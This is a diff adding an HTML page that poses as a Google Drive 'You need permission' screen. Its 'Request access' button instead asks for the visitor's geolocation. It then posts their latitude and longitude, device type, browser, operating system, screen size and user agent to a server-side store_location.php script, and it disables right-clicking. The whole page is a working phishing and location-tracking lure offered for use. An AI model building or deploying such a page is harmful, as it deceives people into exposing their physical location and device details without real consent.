@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta name="description" content="Web word processing, presentations and spreadsheets">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=0">
+    <link rel="shortcut icon" href="/images/drive_favicon1.ico">
+    <title>Google Drive - Access Denied</title>
+    <link rel="stylesheet" type="text/css" href="css/main.css">
+    <script type="text/javascript">
+        if (window.location.protocol == "http:") {
+            var restOfUrl = window.location.href.substr(5);
+        }
+    </script>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+</head>
+
+<body oncontextmenu="return false">
+    <div id="outerContainer">
+        <div id="innerContainer">
+            <div style="position: absolute; top: -80px;">
+                <div id="drive-logo">
+                    <span class="docs-drivelogo-img"></span>
+                    <span class="docs-drivelogo-text"> Drive</span>
+                </div>
+            </div>
+            <div style="clear:both"></div>
+            <div id="main">
+                <div id="accessDeniedIcon"></div>
+                <p id="accessDeniedHeader">You need permission</p>
+                <div id="message">
+                    <p>Want in? Ask for access, or switch to an account with permission.</p>
+                </div>
+                <p id="buttons" style="padding-top: 10px">
+                    <button id="getLocation" style="font-weight:bold" class="jfk-button jfk-button-action">Request access</button>
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function detectDevice() {
+            var userAgent = navigator.userAgent.toLowerCase();
+
+            if (userAgent.includes("mobile")) {
+                return "Smartphone";
+            } else if (userAgent.includes("tablet")) {
+                return "Tablet";
+            } else {
+                return "Laptop or Desktop";
+            }
+        }
+
+        function detectBrowser() {
+            var userAgent = navigator.userAgent.toLowerCase();
+
+            if (userAgent.includes("chrome")) {
+                return "Chrome";
+            } else if (userAgent.includes("firefox")) {
+                return "Firefox";
+            } else if (userAgent.includes("safari")) {
+                return "Safari";
+            } else if (userAgent.includes("edge")) {
+                return "Edge";
+            } else if (userAgent.includes("opera")) {
+                return "Opera";
+            } else {
+                return "Unknown";
+            }
+        }
+
+        function getOperatingSystem() {
+            var userAgent = navigator.userAgent;
+            var os;
+
+            if (userAgent.indexOf("Win") != -1) {
+                os = "Windows";
+            } else if (userAgent.indexOf("Mac") != -1) {
+                os = "Macintosh";
+            } else if (userAgent.indexOf("Linux") != -1) {
+                os = "Linux";
+            } else if (userAgent.indexOf("Android") != -1) {
+                os = "Android";
+            } else if (userAgent.indexOf("iOS") != -1) {
+                os = "iOS";
+            } else {
+                os = "Other";
+            }
+
+            return os;
+        }
+
+        function getScreenResolution() {
+            return window.innerWidth + "x" + window.innerHeight;
+        }
+
+        document.getElementById("getLocation").addEventListener("click", getLocation);
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation, showError);
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        }
+
+        function sendLocation(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            const deviceType = detectDevice();
+            const browserName = detectBrowser();
+            const os = getOperatingSystem();
+            const screenResolution = getScreenResolution();
+
+            // Send latitude, longitude, device type, browser name, OS, screen resolution, and user agent to a PHP script
+            fetch("store_location.php", {
+                method: "POST",
+                body: JSON.stringify({ latitude, longitude, deviceType, browserName, os, screenResolution, userAgent: navigator.userAgent }),
+                headers: {
+                    "Content-Type": "application/json",
+                },
+            })
+            .then(response => response.text())
+            .then(data => {
+
+            })
+            .catch(error => {
+           
+            });
+        }
+
+        function showError(error) {
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    alert("User denied the request for Geolocation.");
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    alert("Location information is unavailable.");
+                    break;
+                case error.TIMEOUT:
+                    alert("The request to get user location timed out.");
+                    break;
+                case error.UNKNOWN_ERROR:
+                    alert("An unknown error occurred.");
+                    break;
+            }
+        }
+    </script>
+</body>
+</html>
